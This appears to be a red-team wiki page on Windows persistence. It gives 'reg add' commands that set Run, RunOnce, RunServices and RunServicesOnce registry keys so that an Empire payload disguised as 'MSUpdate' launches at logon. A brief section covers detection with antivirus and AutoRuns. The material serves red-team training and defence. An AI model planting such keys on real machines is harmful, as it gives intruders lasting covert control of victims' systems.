# Run Registry Keys

#### Operators can achieve persistence by creating registry keys that execute an arbitrary payload during the logon process of a Windows system. This is one of the oldest tricks in the red team playbooks.

run the following command in the shell to add a key called MSUpdate in the Run registry key that points to the malicious binary located in the Temp folder.

```
reg add “HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /v MSUpdate /t REG_SZ /d “C:\Users\tspeedman\AppData\Local\Temp\empire.exe” /f
```

Other registry locations we could use for this kind of persistence are the `RunOnce`, `RunServices` and `RunServicesOnce` registry keys. Below is the syntax of commands you can use for them:

```
reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce” /v MSUpdate /t REG_SZ /d “C:\Users\tspeedman\AppData\Local\Temp\empire.exe”

reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices” /v MSUpdate /t REG_SZ /d “C:\Users\tspeedman\ AppData\Local\Temp\empire.exe “

reg add “HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce” /v MSUpdate /t REG_SZ /d “C:\Users\tspeedman\ AppData\Local\Temp\empire.exe “
```

{% hint style="info" %}
If elevated credentials have been obtained it is preferred to use the Local Machine registry locations instead of the Current User as the payload will executed every time that the system boots regardless of the user who is authenticating with the system.
{% endhint %}

## <mark style="color:red;">Detection</mark>

Most anti-virus products can detect these basic persistence techniques, in this case, if the run keys point to a binary that is not signed by trusted sources, the AV will flag the key and the payload.

the manual detection techniques would be looking for these keys and what they are pointing to (the AutoRuns.exe utility from sysinternals can be used for this).
